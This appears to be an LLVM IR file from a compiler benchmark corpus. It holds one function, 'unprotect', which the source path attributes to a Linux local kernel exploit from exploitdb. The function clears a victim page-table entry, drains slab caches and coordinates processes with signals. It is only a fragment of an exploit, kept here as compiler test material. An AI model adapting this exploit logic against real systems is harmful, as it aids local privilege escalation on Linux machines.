; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_145.c_unprotect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_145.c_unprotect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@victim = common dso_local global i64* null, align 8
@.str = private unnamed_addr constant [29 x i8] c"\0A[+] parent unprotected PTE \00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [14 x i8] c"read slabinfo\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"\0A    depopulate SLAB #%d\00", align 1
@blah = common dso_local global i64 0, align 8
@hpid = common dso_local global i32 0, align 4
@SIGUSR1 = common dso_local global i32 0, align 4
@DUPTO = common dso_local global i32 0, align 4
@redirect_filp = common dso_local global i32 0, align 4
@pid = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @unprotect(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i32 1, i32* %4, align 4
  %5 = load i64*, i64** @victim, align 8
  store i64 0, i64* %5, align 8
  %6 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str, i64 0, i64 0))
  %7 = load i32, i32* @stdout, align 4
  %8 = call i32 @fflush(i32 %7)
  %9 = call i32 @dup2(i32 0, i32 2)
  br label %10

10:                                               ; preds = %1, %49
  %11 = call i32 (...) @get_slab_objs()
  store i32 %11, i32* %3, align 4
  %12 = load i32, i32* %3, align 4
  %13 = icmp slt i32 %12, 0
  br i1 %13, label %14, label %16

14:                                               ; preds = %10
  %15 = call i32 @fatal(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  br label %16

16:                                               ; preds = %14, %10
  %17 = load i32, i32* %3, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %33

19:                                               ; preds = %16
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  %22 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0), i32 %20)
  store i64 0, i64* @blah, align 8
  %23 = load i32, i32* @hpid, align 4
  %24 = load i32, i32* @SIGUSR1, align 4
  %25 = call i32 @kill(i32 %23, i32 %24)
  br label %26

26:                                               ; preds = %30, %19
  %27 = load i64, i64* @blah, align 8
  %28 = icmp ne i64 %27, 0
  %29 = xor i1 %28, true
  br i1 %29, label %30, label %32

30:                                               ; preds = %26
  %31 = call i32 (...) @pause()
  br label %26

32:                                               ; preds = %26
  br label %33

33:                                               ; preds = %32, %16
  %34 = load i32, i32* %3, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %49, label %36

36:                                               ; preds = %33
  store i64 0, i64* @blah, align 8
  %37 = load i32, i32* @hpid, align 4
  %38 = load i32, i32* @SIGUSR1, align 4
  %39 = call i32 @kill(i32 %37, i32 %38)
  br label %40

40:                                               ; preds = %44, %36
  %41 = load i64, i64* @blah, align 8
  %42 = icmp ne i64 %41, 0
  %43 = xor i1 %42, true
  br i1 %43, label %44, label %46

44:                                               ; preds = %40
  %45 = call i32 (...) @pause()
  br label %40

46:                                               ; preds = %40
  %47 = load i32, i32* @DUPTO, align 4
  %48 = call i32 @dup2(i32 0, i32 %47)
  br label %50

49:                                               ; preds = %33
  br label %10

50:                                               ; preds = %46
  %51 = load i32, i32* @SIGUSR1, align 4
  %52 = call i32 @signal(i32 %51, i32* @redirect_filp)
  %53 = load i32, i32* @pid, align 4
  %54 = load i32, i32* @SIGUSR1, align 4
  %55 = call i32 @kill(i32 %53, i32 %54)
  ret void
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @dup2(i32, i32) #1

declare dso_local i32 @get_slab_objs(...) #1

declare dso_local i32 @fatal(i8*) #1

declare dso_local i32 @kill(i32, i32) #1

declare dso_local i32 @pause(...) #1

declare dso_local i32 @signal(i32, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
